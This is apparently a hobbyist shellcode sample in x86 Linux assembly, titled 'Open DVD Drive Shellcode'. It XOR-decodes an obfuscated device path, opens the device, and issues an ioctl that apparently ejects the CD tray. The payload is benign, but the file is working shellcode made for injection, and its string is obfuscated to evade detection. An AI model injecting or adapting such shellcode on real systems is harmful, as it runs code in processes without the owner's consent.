; Open DVD Drive Shellcode
; Website: www.r3oath.com

global _start

section .text
_start:

	push edx
	mov esi, 0xdeadbeef
	push 0xdeadd380
	push 0xacc9ddc0
	push 0xa8c8dac0
	mov ebx, esp
	mov cl, 0x3
	add esp, 0x8
	xor [esp], esi
	sub esp, 0x4
	loop $-6
	mov ecx, eax
	mov cx, 0x811
	sub cx, 0x11
	mov al, 0x5
	int 0x80
	mov ebx, eax
	mov al, 0x36
	mov cx, 21257
	int 0x80
